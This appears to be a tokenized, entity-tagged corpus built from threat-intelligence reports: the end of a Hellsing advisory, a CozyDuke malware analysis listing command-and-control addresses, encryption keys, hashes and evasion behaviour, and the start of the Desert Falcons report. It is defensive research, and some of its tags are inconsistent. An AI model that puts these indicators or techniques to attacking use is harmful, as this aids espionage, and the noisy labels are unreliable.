address
books
from
victims
and
then
mass-mailing
everyone
on
each
of
these
lists
.

But
,
considering
the
timing
and
origin
of
the
attack
,
the
current
case
seems
more
likely
to
be
an
APT-on-APT
attack
.

To
protect
against
a
Hellsing
attack
,
we
recommend
that
organisations
follow
basic
security
best
practices
:
Don't
open
attachments
from
people
you
don't
know
Beware
of
password-protected
archives
which
contain
SCR
or
other
executable
files
inside
If
you
are
unsure
about
the
attachment
,
try
to
open
it
in
a
sandbox
Make
sure
you
have
a
modern
operating
system
with
all
patches
installed
Update
all
third
party
applications
such
as
Microsoft
Office
,
Java
,
Adobe
Flash
Player
and
Adobe
Reader

Kaspersky
Lab
products
detect
the
backdoors
used
by
the
Hellsing
attacker
as
:
HEUR:Trojan.Win32.Generic
,
Trojan-Dropper.Win32.Agent.kbuj
,
Trojan-
Dropper.Win32.Agent.kzqq
.

Deny
the
Hellsing
APT
by
default
Appendix
:
Hellsing
Indicators
of
Compromise

Evernote
makes
it
easy
to
remember
things
big
and
small
from
your
everyday
life
using
your
computer
,
tablet
,
phone
and
the
web.Terms
of
ServicePrivacy
Policy
The
CozyDuke
APT

CozyDuke
(
aka
CozyBear
,
CozyCar
or
'Office
Monkeys
'
)
is
a
threat
actor
that
became
increasingly
active
in
the
2nd
half
of
2014
and
hit
a
variety
of
targets
.

The
White
House
and
Department
of
State
are
two
of
the
most
spectacular
known
victims
.

The
operation
presents
several
interesting
aspects
blatantly
sensitive
high
profile
victims
and
targets
crypto
and
anti-detection
capabilities
strong
malware
functional
and
structural
similarities
mating
this
toolset
to
early
MiniDuke B_malware.infosteal
second
stage
components
,
along
with
more
recent
CosmicDuke B_malware.infosteal
and
OnionDuke B_malware.backdoor
components

The
actor
often
spearphishes
targets
with
e-mails
containing
a
link
to
a
hacked
website
.

Sometimes
it
is
a
high
profile
,
legitimate
site
such
as
'
diplomacy.pl B_url.normal
'
,
hosting
a
ZIP
archive
.

The
ZIP
archive
contains
a
RAR
SFX
which
installs
the
malware
and
shows
an
empty
PDF
decoy
.

In
other
highly
successful
runs
,
this
actor
sends
out
phony
flash
videos
directly
as
email
attachments
.

A
clever
example
is
'
Office B_malware.drop
Monkeys I
LOL I
Video.zip I
'
.

The
executable
within
not
only
plays
a
flash
video
,
but
drops
and
runs
another
CozyDuke
executable
.

These
videos
are
quickly
passed
around
offices
with
delight
while
systems
are
infected
in
the
background
silently
.

Many
of
this
APT
's
components
are
signed
with
phony
Intel
and
AMD
digital
certificates
.

Recent
Cozyduke
APT
activity
attracted
significant
attention
in
the
news
:
Sources
:
State
Dept
.

hack
the
'
worst
ever
'
White
House
computer
network
'
hacked
'
Three
Months
Later
,
State
Department
Has
n't
Rooted
Out
Hackers
State
Department
shuts
down
its
e-mail
system
amid
concerns
about
hacking
Let's
examine
a
smattering
of
representative
CozyDuke
files
and
data
.
There
is
much
to
their
toolset
.

Office
Monkeys
dropper
analysis
The
droppers
and
spyware
components
often
maintain
fairly
common
characteristics
68271df868f462c06e24a896a9494225
,
Office B_malware.drop
Monkeys I
LOL I
Video.zip I

Believe
it
or
not
,
recipients
in
bulk
run
the
file
within
:
95b3ec0a4e539efaa1faa3d4e25d51de
,
Office B_malware.drop
Monkeys I
( I
Short I
Flash I
Movie I
).exe I

This
file
in
turn
drops
two
executables
to
%
temp
%
2aabd78ef11926d7b562fd0d91e68ad3
,
Monkeys.exe
3d3363598f87c78826c859077606e514
,
player.exe B_malware.infosteal

It
first
launches
Monkeys.exe
,
playing
a
self-contained
,
very
funny
video
of
white-collar
tie
wearing
chimpanzees
working
in
a
high
rise
office
with
a
human
colleague
.

It
then
launches
player.exe B_malware.infosteal
,
a
CozyDuke
dropper
maintaining
anti-detection
techniques
:
3d3363598f87c78826c859077606e514,338kb,player.exe,Trojan.Win32.CozyBear.v,CompiledOn:2014.07
.

02
21:13:33
The
file
collects
system
information
,
and
then
invokes
a
WMI
instance
in
the
root\securitycenter
namespace
to
identify
security
products
installed
on
the
system
,
meaning
that
this
code
was
built
for
x86
systems
,
wql
here
:
SELECT
*
FROM
AntiVirusProduct
SELECT
*
FROM
FireWallProduct

The
code
hunts
for
several
security
products
to
evade
:
CRYSTAL
KASPERSKY
SOPHOS
DrWeb
AVIRA
COMODO
Dragon

In
addition
to
the
WMI/wql
use
,
it
also
hunts
through
the
'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\
'
registry
key
looking
for
security
products
to
avoid
.

Following
these
checks
,
it
drops
several
more
malware
files
signed
with
the
pasted
AMD
digital
signature
to
a
directory
it
creates
.

These
files
are
stored
within
an
217kb
encrypted
cab
file
in
the
dropper
's
resources
under
the
name
'A
'
.

The
cab
file
was
encrypted
and
decrypted
using
a
simple
xor
cipher
with
a
rotating
16
byte
key
:
\x36\x11\xdd\x08\xac\x4b\x72\xf8\x51\x04\x68\x2e\x3e\x38\x64\x32
.

The
cab
file
is
decompressed
and
its
contents
are
created
on
disk
.

These
dropped
files
bundle
functionality
for
both
64bit
and
32bit
Windows
systems
:
C
:
\Documents
and
Settings\user\Application
Data\ATI_Subsystem\
6761106f816313394a653db5172dc487,54kb,amdhcp32.dll
<-
32bit
dll,CompiledOn:2014.07.02
21:13:24
d596827d48a3ff836545b3a999f2c3e3,60kb,aticaldd.dll
<-
64bit
dll,CompiledOn:2014.07.02
21:13:26
bc626c8f11ed753f33ad1c0fe848d898,285kb,atiumdag.dll
<-
32bit
dll
,
279kb
,
Trojan.Win32.CozyDuke.a
,
CompiledOn:2014.07.02
21:13:26
4152e79e3dbde55dcf3fc2014700a022,6kb,racss.dat
The
code
copies
rundll32.exe
from
windows\system32
to
its
newly
created
%
appdata
%
\ATI_Subsystem
subdirectory
as
'
amdocl_as32.exe
'
alongside
the
three
dll
's
listed
above
.

It
runs
atiumdag.dll
with
two
parameter
values
,
it
's
only
export
and
an
arbitrary
pid
,
i.e.
:
'C
:
\Documents
and
Settings\user\Application
Data\ATI_Subsystem\amdocl_as32.exe
'
'C
:
\Documents
and
Settings\user\Application
Data\ATI_Subsystem\atiumdag.dll
''
,
ADL2_ApplicationProfiles_System_Reload
1684
'
This
dll
is
built
with
anti-AV
protections
as
well
.

However
,
it
looks
for
a
different
but
overlapping
set
,
and
the
random
duplication
suggests
that
this
component
was
cobbled
together
with
its
dropper
,
partly
regionally
based
on
target
selection
.

KASPERSKY
The
code
collects
information
about
the
system
efd5aba3-6719-4655-8a72-1aa93feefa38C
:
\Documents
and
Settings\user\Application
Data\ATI_Subsystem\amdocl_as32exeMyPCuserMicrosoft
Windows
XP
512600
SP
30
x32Admin192.60.11.1008:11:17:f2:9a:efSophos
Anti-Virus
Finally
,
this
process
beacons
to
www.sanjosemaristas.com
,
which
appears
to
be
a
site
that
has
been
compromised
and
misused
multiple
times
in
the
past
couple
of
years
.

hxxp://www.sanjosemaristas.com/app/index.php?{A01BA0AD-9BB3-4F38-B76B-A00AD11CBAAA
}
,
providing
the
current
network
adapter
's
service
name
GUID
.

It
uses
standard
Win32
base
cryptography
functions
to
generate
a
CALG_RC4
session
key
to
encrypt
the
collected
data
communications
and
POSTs
it
to
the
server
.

Executable-Signing
Certificates

Samples
are
usually
signed
with
a
fake
certificate
-
we've
seen
two
instances
,
one
AMD
and
one
Intel
:

Configuration
files
:
Some
of
the
malware
uses
an
encrypted
configuration
file
which
is
stored
on
disk
as
'
racss.dat
'
.

This
is
encrypted
by
RC4
,
using
key
{
0xb5
,
0x78
,
0x62
,
0x52
,
0x98
,
0x3e
,
0x24
,
0xd7
,
0x3b
,
0xc6
,
0xee
,
0x7c
,
4/21/2015The
CozyDuke
APT
-
Securelisthttps://www.evernote.com/shard/s170/nl/19724058/59b535d9-1b13-4c1b-9fbc-22386837eae5/
?
csrfBusterToken=U
%
3D12cf71a
%
3AP
%
3D
%
2F
%
3A...3/10
0xb9
,
0xed
,
0x91
,
0x62
}
.

Here
's
how
it
looks
decrypted
:
C
&
Cs
:
121.193.130.170:443/wp-ajax.php B_ip_cncsvr
183.78.169.5:443/search.php B_ip_cncsvr
200.119.128.45:443/mobile.php B_ip_cncsvr
200.125.133.28:443/search.php B_ip_cncsvr
200.125.142.11:443/news.php B_ip_cncsvr
201.76.51.10:443/plugins/json.php B_ip_cncsvr
202.206.232.20:443/rss.php B_ip_cncsvr
202.76.237.216:443/search.php B_ip_cncsvr
203.156.161.49:443/plugins/twitter.php B_ip_cncsvr
208.75.241.246:443/msearch.php B_ip_cncsvr
209.40.72.2:443/plugins/fsearch.php B_ip_cncsvr
210.59.2.20:443/search.php B_ip_cncsvr
208.77.177.24:443/fsearch.php B_ip_cncsvr
www.getiton.hants.org.uk:80/themes/front/img/ajax.php B_url_cncsvr
www.seccionpolitica.com.ar:80/galeria/index.php B_url_cncsvr
209.200.83.43/ajax/links.php B_ip_cncsvr
209.200.83.43/ajax/api.php B_ip_cncsvr
209.200.83.43/ajax/index.php B_ip_cncsvr
209.200.83.43/ajax/error.php B_ip_cncsvr
209.200.83.43/ajax/profile.php B_ip_cncsvr
209.200.83.43/ajax/online.php B_ip_cncsvr
209.200.83.43/ajax/loader.php B_ip_cncsvr
209.200.83.43/ajax/search.php B_ip_cncsvr

Second
stage
malware
and
communications
:
The
attackers
send
commands
and
new
modules
to
be
executed
to
the
victims
through
the
C
&
Cs
.

The
C
&
C
scripts
store
these
temporarily
until
the
next
victim
connects
in
local
files
.

We've
identified
two
such
files
:
settings.db
sdfg3d.db
Here's
how
such
a
database
file
appears
:

These
are
BASE64
encoded
and
use
the
same
RC4
encryption
key
as
the
malware
configuration
.

Decoding
them
resulted
in
the
following
payloads
:
59704bc8bedef32709ab1128734aa846
*ChromeUpdate.ex_
5d8835982d8bfc8b047eb47322436c8a
*cmd_task.dll
e0b6f0d368c81a0fb197774d0072f759
*screenshot_task.dll
Decoding
them
also
resulted
in
a
set
of
tasking
files
maintaining
agent
commands
and
parameter
values
:
conf.xml

And
a
set
of
'reporting
'
files
,
maintaining
stolen
system
'info
'
,
error
output
,
and
'AgentInfo
'
output
,
from
victim
systems
:
DCOM_amdocl_ld_API_.raw
Util_amdave_System_.vol
Last_amdpcom_Subsystem_.max
Data_amdmiracast_API_.aaf
7.txt

screenshot_task.dll
is
a
32-bit
dll
used
to
take
a
screenshot
of
the
full
desktop
window
and
save
it
as
a
bitmap
in
%
temp
%
.

The
number
of
times
the
screenshot
is
repeated
is
configurable
within
the
xml
task
file
.

cmd_task.dll
is
a
32-bit
dll
that
maintains
several
primitives
.

It
is
used
to
create
new
processes
,
perform
as
a
command
line
shell
,
and
several
other
tasks
.

Each
of
these
payloads
is
delivered
together
with
a
configuration
file
that
explains
how
to
run
it
,
for
instance
:
4/21/2015The
CozyDuke
APT
-
Securelisthttps://www.evernote.com/shard/s170/nl/19724058/59b535d9-1b13-4c1b-9fbc-22386837eae5/
?
csrfBusterToken=U
%
3D12cf71a
%
3AP
%
3D
%
2F
%
3A...5/10
Furthermore
,
ChromeUpdate
is
a
64-bit
executable
(
which
appears
to
be
a
WEXTRACT
package
)
that
oddly
drops
a
32-bit
Dll
.

Cache.dll
is
simply
stored
as
a
cabinet
file
in
the
ChromeUpdate
's
resource
section
.

ChromeUpdate.exe
starts
the
file
with
'rundll32
cache.dll,ADB_Setup
'
Cache.dll
analysis
Cache.dll
was
written
in
C/C++
and
built
with
a
Microsoft
compiler
.

Cache.dll
code
flow
overview
rc4
decrypt
hardcoded
c2
and
urls
resolve
hidden
function
calls
collect
identifying
victim
system
data
encrypt
collected
data
send
stolen
data
to
c2
and
retrieve
commands

Cache.dll
code
details

Structurally
,
cache.dll
is
a
fairly
large
backdoor
at
425kb
.

It
maintains
both
code
and
data
in
the
raw
,
encrypted
blobs
of
data
to
be
decrypted
and
used
at
runtime
,
and
hidden
functionality
that
is
n't
exposed
until
runtime
.
No
pdb/debug
strings
are
present
in
the
code
.

It
maintains
eight
exports
,
including
DllMain
:

ADB_Add
ADB_Cleanup
ADB_Initnj
ADB_Load
ADB_Release
ADB_Remove
ADB_Setup

ADB_Setup
is
a
entry
point
that
simply
spawns
another
thread
and
waits
for
completion
.

Above
,
we
see
a
new
thread
created
with
the
start
address
of
Cache.dll
export
'
ADB_Load
'
by
the
initial
thread
.

This
exported
function
is
passed
control
while
the
initial
thread
runs
a
Windows
message
loop
.

It
first
grabs
an
encrypted
blob
stored
away
in
a
global
variable
and
pulls
out
381
bytes
of
this
encrypted
data
:

The
standard
win32
api
CryptDecrypt
uses
rc4
to
decrypt
this
blob
into
a
hardcoded
c2
,
url
path
,
and
url
parameters
listed
below
with
a
simple
140-bit
key
'\x8B\xFF\x55\x8B\xEC\x83\xEC\x50\xA1\x84\x18\x03\x68\x33\xC9\x66\xF7\x45\x10\xE8\x1F\x89\x45\xF
C\x8B\x45\x14\x56
'
.

The
code
then
decodes
this
set
of
import
symbols
and
resolves
addresses
for
its
networking
and
data
stealing
functionality
:
InternetCloseHandle
InternetReadFile
HttpSendRequestA
HttpOpenRequestA
HttpQueryInfoA
InternetConnectA
InternetCrackUrlA
InternetOpenA
InternetSetOptionW
GetAdaptersInfo

Much
like
the
prior
office
monkey
'
atiumdag.dll
'
component
,
this
code
collects
identifying
system
information
using
standard
win32
API
calls
:

Computer
name
-
GetComputerNameW
User
name
-
GetUserNameW
Adapter
GUID
,
ip
address
,
mac
address
-
GetAdaptersInfo
Windows
version
-
GetVersionExW

It
then
uses
the
runtime
resolved
networking
API
calls
to
send
the
collected
data
back
to
a
hardcoded
c2
and
set
of
urls
.

Cache.dll
connectback
urls
:
209.200.83.43/ajax/links.php B_ip.cncsvr
209.200.83.43/ajax/api.php B_ip.cncsvr
209.200.83.43/ajax/index.php B_ip.cncsvr
209.200.83.43/ajax/error.php B_ip.cncsvr
209.200.83.43/ajax/profile.php B_ip.cncsvr
209.200.83.43/ajax/online.php B_ip.cncsvr
209.200.83.43/ajax/loader.php B_ip.cncsvr
209.200.83.43/ajax/search.php B_ip.cncsvr
Observed
user-agent
string
on
the
wire
,
but
it's
dynamically
generated
based
on
the
Windows
system
settings
(
retrieved
using
standard
win32
api
'ObtainUserAgentString
'
)
:
'User-Agent
:
Mozilla/4.0
(
compatible
;
MSIE
6.0
;
Windows
NT
5.1
;
SV1
;
.NET
CLR
2.0.50727
;
.NET
CLR
3.0.04506.648
;
.NET
CLR
3.5.21022
)
'

Connections
with
MiniDuke B_malware.infosteal
//
OnionDuke B_malware.backdoor
:

One
of
the
second
stage
modules
of
Cozy
Bear
,
Show.dll
,
is
particularly
interesting
because
it
appears
to
have
been
built
onto
the
same
platform
as
OnionDuke B_malware.backdoor
.

Below
we
compare
Show.dll
with
the
OnionDuke B_malware.backdoor
sample
MD5
:
c8eb6040fd02d77660d19057a38ff769 B_hash
.

Both
have
exactly
the
same
export
tables
and
appear
to
be
called
internally
'
UserCache.dll
'
:
This
seems
to
indicate
the
authors
of
OnionDuke B_malware.backdoor
and
Cozy
Bear
are
the
same
,
or
working
together
.

Another
interesting
comparison
of
two
other
files
matches
a
recent
second
stage
tool
from
the
CozyDuke
attacks
with
a
second
stage
component
from
other
Miniduke B_malware.infosteal
/
Onionduke B_malware.backdoor
attacks
.

2e0361fd73f60c76c69806205307ccac B_hash
,
update.dll
(
Miniduke B_malware.infosteal
)
,
425kb
(
internal
name
=
'UserCache.dll
'
)
9e3f3b5e9ece79102d257e8cf982e09e B_hash
,
cache.dll
(
Cozyduke
)
,
425kb
(
internal
name
=
'UserCache.dll
'
)
The
two
share
identical
export
function
names
in
their
export
directories
,
and
the
naming
appears
to
be
randomly
assigned
at
compile
time
.

The
table
below
presents
the
function
matches
based
on
size
data
,
but
the
calls
,
jmps
and
code
all
match
as
well
.

The
contents
of
only
one
of
these
exports
in
update.dll
has
no
match
whatsoever
in
cache.dll
.

Unlike
the
atiumdag.dll
file
above
,
however
,
cache.dll
and
update.dll
do
not
maintain
anti-AV
and
anti-analysis
functionality
sets
.

Perhaps
they
plan
to
pair
this
stealer
with
another
dropper
that
maintains
the
WMI
anti-AV
functionality
.

We
expect
ongoing
and
further
activity
from
this
group
in
the
near
future
and
variations
on
the
malware
used
in
previous
duke-ish
incidents
.

For
more
information
about
MiniDuke B_malware.infosteal
,
CosmicDuke B_malware.infosteal
and
OnionDuke B_malware.backdoor
,
please
see
References
.

Appendix
:
Parallel
and
Previous
Research
The
MiniDuke B_malware.infosteal
Mystery
:
PDF
0-day
Government
Spy
Assembler
0x29A
Micro
Backdoor
,
Securelist
,
Feb
2013
Miniduke B_malware.infosteal
is
back
:
Nemesis
Gemina
and
the
Botgen
Studio
,
Securelist
,
July
2014
MiniDuke B_malware.infosteal
2 I
(
CosmicDuke B_malware.infosteal
)
,
CrySyS
,
July
2014
COSMICDUKE B_malware.infosteal
Cosmu
with
a
twist
of
MiniDuke B_malware.infosteal
[
pdf
]
,
F-Secure
,
September
2014
THE
CASE
OF
THE
MODIFIED
BINARIES
,
Leviathan
Security
,
October
2014
A
word
on
CosmicDuke B_malware.infosteal
,
Blaze
's
Security
Blog
,
September
2014
OnionDuke B_malware.backdoor
:
APT
Attacks
Via
the
Tor
Network
,
F-Secure
,
November
2014
The
Connections
Between
MiniDuke B_malware.infosteal
,
CosmicDuke B_malware.infosteal
and
OnionDuke B_malware.backdoor
,
F-Secure
,
January
2015
4/21/2015The
CozyDuke
APT
-
Securelisthttps://www.evernote.com/shard/s170/nl/19724058/59b535d9-1b13-4c1b-9fbc-22386837eae5/
?
csrfBusterToken=U
%
3D12cf71a
%
3AP
%
3D
%
2F
%
3...10/10Evernote
makes
it
easy
to
remember
things
big
and
small
from
your
everyday
life
using
your
computer
,
tablet
,
phone
and
the
web.Terms
of
ServicePrivacy
Policy
THE
DESERT B_malware.drop
FALCONS I
TARGETED
ATTACKS
Version
2.0
February
,
2015
#
TheSAS2015
#
FalconsAPT B_malware.drop
Table
of
contents
1
.

Executive
Summary
...........................................................................
4
2
.

Introduction
........................................................................................
5
3
.

Operation
Goals
and
Victim
Profiles
..................................................
6
3.1
.

Stolen
Files
information
............................................................................
7
4
.

Operation
Analysis
.............................................................................
8
4.1
.

Deceive
and
Infect
.....................................................................................
8
4.1.1
.

Targeted
emails
and
documents
...................................................
8
4.1.2
.

Just
click
the
shortcut
:
the
rar/lnk
trick
......................................11
4.1.3
.

Right-to-left
extension
override
trick
...........................................12
4.1.4
.

Social
Networking
tricks...............................................................12
4.1.5
.

The
fake
RealPlayer
plugin
trick
..................................................14
4.2
.

Infiltrate
and
Spy
......................................................................................15
4.2.1
.

The
Falcons B_malware.drop
'
main
Trojan
............................................................15
4.2.2
.

DHS
spyware
.................................................................................16
4.2.3
.

DHS2015
,
also
called
iRat...........................................................17
4.2.4
.

Mobile
backdoor
traces
...............................................................17
4.2.5
.

Other
tools
by
DHS
.......................................................................18
4.2.6
.

Compilation
timeline
for
samples................................................19
4.3
.

Track
and
Control
.....................................................................................19
4.3.1
.

1st
Campaign
-
targeting
computer
devices
and
mobiles
...........19
4.3.2
.

2nd
Campaign
................................................................................20
4.3.3
.

3rd
Campaign
................................................................................20
4.3.4
Liptona.net
.....................................................................................21
4.3.4
.

Campaigns
operational
timeline
.................................................22
TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
2
5
.

Attribution
.........................................................................................
23
6
.

Conclusion
........................................................................................
24
7
.

Appendix
...........................................................................................
25
7.1
.

Appendix
1
:
C
&
Cs
Whois
History
...........................................................25
7.2
.

Appendix
2
:
IOC
&
Samples
....................................................................25
7.2.1
.

Known
'
Falcons B_malware.drop
'
C&C
hostnames
..............................................25
7.2.2
.

Related
Domains
.................................................................................26
7.2.3
.

Known
'
Falcons B_malware.drop
'
C
&
C
IPs
............................................................26
7.2.4
.

MD5s
of
backdoors
used
in
the
attacks
.....................................26
7.2.5
.

Backdoor
related
files
..................................................................27
7.2.6
.

Attacker
e-mail
accounts
used
in
spear
phishing
attacks
.........27
TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
3
1
.

Executive
Summary
DESERT B_malware.drop
Falcons I
is
a
new
group
of
cybermercenaries
operating
from
the
Middle
East
and
using
a
set
of
methods
to
hide
and
operate
malware
.

The
cybercriminals
appear
to
be
highly
skilled
:
in
addition
to
proficient
social
engineering
tricks
,
they
have
developed
the
following
from
scratch
:
•
Computer
systems
malware
targeting
Windows
devices
•
Mobile
malware
targeting
Android
devices
•
Infection
vectors
,
including
phishing
emails
,
fake
websites
and
fake
social
networking
accounts
Potential
victims
were
enticed
with
socio-political
news
and
information
,
and
many
succumbed
rapidly
to
malware
infection
.

The
victims
targeted
include
:
•
Military
and
Government
•
Newspaper
,
TV/Radio
Channels
and
Top
Media
Outlets
•
Financial
and
Trading
Institutions
•
Research
and
Education
Institutions
•
Activists
and
Political
Leaders
•
Energy
Firms
•
Physical
Security
Companies
Victims
of
the
DESERT B_malware.drop
Falcons I
are
located
mainly
in
the
following
countries
:
•
Egypt
•
Palestine
•
Israel
•
Jordan
The
DESERT B_malware.drop
Falcons I
cybercriminals
are
native
Arabic
speakers
;
and
it
is
believed
to
be
the
first
known
Arab
group
to
develop
and
run
a
full
cyber
espionage
operation
.

DESERT B_malware.drop
Falcons I
began
its
operations
in
2011
,
with
the
first
infections
taking
place
in
2013
.

The
group
became
very
active
in
late
2014/early
2015
.

The
DESERT B_malware.drop
Falcons I
comprises
around
30
members
working
in
three
teams
and
operating
mainly
out
of
Palestine
,
Egypt
and
Turkey
.

The
number
of
victims
to
date
exceeds
3,000
.

The
group
's
malware
was
originally
found
during
an
attack
investigation
in
the
Middle
East
.

Kaspersky
Lab
clients
are
protected
from
infection
,
with
the
malware
files
and
domains
used
in
the
targeted
attacks
detected
and
blocked
.

TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
4
2
.

Introduction
The
geopolitical
conflicts
in
the
Middle
East
have
deepened
over
the
last
few
years
.

The
crisis
is
taking
many
forms
,
and
the
conflict
in
cyberspace
is
intensifying
as
different
sides
try
to
shift
the
struggle
in
their
favour
by
exploiting
cyber
intelligence
and
distorting
news
.

Targeted
cyberattacks
have
also
increased
rapidly
in
the
region
over
the
last
few
years
,
with
victims
identified
for
almost
every
one
of
the
major
advanced
cyberattack
campaigns
(
Regin
,
Epic
Turla
,
Careto
,
Nettraveler
,
Red
October
,
Flame
,
Gauss
,
Duqu
,
and
more
.
)

The
Global
Research
and
Analysis
Team
(
GReAT
)
at
Kaspersky
Lab
has
uncovered
new
targeted
attacks
in
the
Middle
East
.

Native
Arabic-speaking
cybercriminals
have
built
advanced
methods
and
tools
to
deliver
,
hide
and
operate
malware
that
they
have
also
developed
themselves
.

This
malware
was
originally
discovered
during
an
investigation
of
one
of
the
attacks
in
the
Middle
East
.

Political
activities
and
news
are
being
actively
used
by
the
cybercriminals
to
entice
victims
into
opening
files
and
attachments
.

Content
has
been
created
with
professionalism
,
with
well
designed
visuals
and
interesting
,
familiar
details
for
the
victims
,
as
if
the
information
were
long
awaited
.

The
victims
of
the
attacks
to
date
have
been
carefully
chosen
;
they
are
active
and
influential
in
their
respective
cultures
,
but
also
attractive
to
the
cybercriminals
as
a
source
of
intelligence
and
a
target
for
extortion
.

The
attackers
have
been
operating
for
more
than
two
years
now
,
running
different
campaigns
,
targeting
different
types
of
victims
and
different
types
of
devices
(
including
Windows
-
and
Android-based
)
.

We
suspect
that
at
least
30
people
distributed
across
different
countries
are
operating
the
campaigns
.

As
a
security
organization
,
our
analysis
has
focused
only
on
the
malware
and
the
facts
uncovered
during
our
research
.

The
falcon
is
a
popular
and
rare
bird
that
has
existed
for
a
long
time
in
Arabian
countries
with
DESERTs
,
such
as
Egypt
,
Syria
,
the
United
Arab
Emirates
,
Palestine
,
Saudi
Arabia
,
and
Oman
,
among
others
.

It
is
also
a
symbol
of
hunting
and
sharp
vision
.

The
DESERT B_malware.drop
Falcons I
are
proficient
cyberattackers
,
with
carefully
chosen
targets
,
who
are
all
thoroughly
investigated
before
being
attacked
and
infected
.

TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
5
3
.

Operation
Goals
and
Victim
Profiles
One
of
the
most
mysterious
things
about
the
Falcons B_malware.drop
is
the
range
and
variety
of
victims
;
with
clear
political
,
geographical
and
social
distinctions
between
them
.

Further
details
of
individual
categories
of
victims
Victim
Category
Victim
Description
Media
Organizations
and
popular
senior
reporters
from
large
and
small
,
global
and
local
media
organizations
,
with
wide
coverage
in
the
Middle
East
region
Education
and
Activists
Islamic
universities
,
immigrants
and
rights
activists
of
Arab
origin
were
among
the
most
targeted
;
with
attackers
trawling
through
pictures
,
video
and
audio
recordings
Government
Organisations
and
personnel
responsible
for
national
health
,
combatting
money
laundering
,
economy
,
trade
,
ministries
,
research
and
development
Military
High-ranking
personnel
related
to
security
agencies
and
army
command
units
Energy
/
Utilities
Critical
infrastructure
suppliers
(
power
,
oil
and
gas
,
construction
and
smart
grids
)
Industrial
Financial
Physical
Security
Supply
chain
contractors
providing
manufacturing
material
and
equipment
for
clients
including
the
military
and
aerospace
.

Multiple
banks
and
investment
firms
were
affected
One
of
the
most
mysterious
victim
categories
,
with
major
firms
targeted
in
multiple
countries
.

TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
6
A
screenshot
from
one
of
the
physical
security
providers
targeted
shows
the
attackers
'
interest
in
information
about
security
officers
and
their
assignments
.

It
is
possible
that
these
victims
were
targeted
in
order
to
collect
useful
information
that
could
be
used
in
actual
physical
crime
.

3.1
.

Stolen
Files
information
The
DESERT B_malware.drop
Falcons I
'
operations
were
found
to
be
mainly
focused
on
political
and
military
intelligence
.

In
all
,
the
attackers
were
able
to
steal
more
than
one
million
files
and
documents
containing
sensitive
information
from
victims
'
computers
and
devices
.

TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
7
4
.

Operation
Analysis
The
DESERT B_malware.drop
Falcons I
make
use
of
different
tools
and
techniques
to
Deliver
,
Infect
,
Spy
on
and
Manage
their
victims
.

Below
we
outline
each
of
the
methods
involved
and
how
they
were
carefully
used
to
operate
the
cyber
espionage
activities
.

They
are
grouped
into
three
sections
as
follows
:
•
Deceive
and
Infect
•
Infiltrate
and
Spy
•
Track
and
Control
4.1
.

Deceive
and
Infect
Malware
writers
use
multiple
technical
and
social
engineering
methods
to
deliver
their
files
and
encourage
the
victims
to
run
them
;
creating
an
effective
infection
vector
,
even
when
they
are
targeting
what
should
be
well-protected
organisations
such
as
governments
,
banks
and
leading
media
outlets
.

In
this
case
the
attackers
depended
mainly
on
social
engineering
to
exploit
:
•
Victims
'
trust
in
social
networking
forums
•
Victims
'
curiosity
about
news
relating
to
political
conflict
in
their
country
In
the
following
sections
we
outline
the
different
methods
used
by
the
cybercriminals
to
infect
their
victims
.

4.1.1
.

Targeted
emails
and
documents
The
Falcons B_malware.drop
attacks
used
spear
phishing
e-mails
that
attempted
to
trick
the
victim
into
opening
a
malicious
attachment
.

Spear
phishing
was
mainly
used
when
targeting
important
victims
such
as
governments
or
high
profile
media
.

The
spear
phishing
e-mails
used
by
the
Falcons B_malware.drop
were
very
well
structured
with
filenames
and
attachments
selected
with
care
for
the
targeted
victim
.

Email
samples
Email
information
From
:
يذيفنتلا
ريتركسلا
(
Executive
Secretary
)
Subject
:
ةيلاملا
تاقحتسملا
(
The
financial
benefits
)
Attachment
:
//تاقحتسملا.rar//تاقحتسملا
صوصخب
لصافلا
ريرقتلا.scr
(
a
detailed
report
on
the
benefits
)
From
:
انر
ةيملاعلاا
(
The
media
reporter
Rana
)
Subject
:
عامتجلااب
كريكذت
دوا
(
ديفيد
يماحملا
بتكم
ريدم
)
.أ
ابحرم
ريرقتلاو
روصلا
ةعجارمو
(
Hi
,
this
is
the
manager
of
the
Lawyer
David
,
to
remind
you
of
the
meeting
to
review
the
pictures
and
the
report
)
Time
of
delivery
March
2014
March
2014
TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
8
Email
information
From
:
news
letar
Subject
:
הלודגה
הפצוחה
(
most
cruel
)
Attachment
:
יבאעז
ןינח.rar//eeee.scr//04.exe
From
:
'news
letar
'
<
newsletar05@gmail.com
>
Subject
:
הלודגה
הפצוחה
]
Attachment
:
יבאעז
ןינח.rar//eeee.scr//04.exe
From
:
'Italy
Office
'
<
italy.officce@gmail.com
>
]
Subject
:
Safe
migration
-
ةنمآ
ةرجه
Attachment
:
Visa
Travel
docx.rar//Image
visa
jpg.scr//H.exe
From
:
'ynet48
'
<
ynet48@gmail.com
>
]
Subject
:
ונלש
תויטרפהו...
6ןופיא
]
(
iPhone
6
and
our
privacy
)
Attachment
:
ןופיא.rar//
?
?
?

?
?
?
?

?
.scr//02.exe
From
:
'mako
mako
'
<
mako22014@gmail.com
>
]
Subject
:
םינש
רשע
דוע
ליארשיל
הרוק
המ
(
what
will
happen
to
Israel
in
ten
years
)
Attachment
:
הנידמב
ריכב.rar//ss.scr//02.exe
Time
of
delivery
Sept
2014
Sept
2014
Sept
2014
Sept
2014
Sept
2014
File
samples
File
Name
'راشبو
يسيسلا
نيب
هديدجلا
تاقلاعلا
قافا
دسلأا.rar
'
דאעש.rar
ةياهنلا
ةيادب
هلحرمو
رصمب
شهني
باهرلإا
تبرتقا.scr
عقاو
...
جراخلا
يف
ةينيطسلفلا
تارافسل
كوربم
مارم_
اهرودل
يثري.rar
يف
تاقياضملاو
رقفلا
نيب
ةزغ
يدايص
ىتم
ىلإ
ديصلا.docx.scr
meetings-recordrcs.pdf
Visa
Travel
docx.scr
'نييركسعلا
صوصخب
17
مقر
يلاملا
رارقلا
docx.scr
'
הלשממה
שאר
תכשלב
תינימ
הדרטה.rar
תסינכ
תיבב
עגיפ.scr
يلع
تادجتسملا
رخا
لوح
يسايس
ريرقت
ةيلخادلا
ةحاسلا.scr
Translation
The
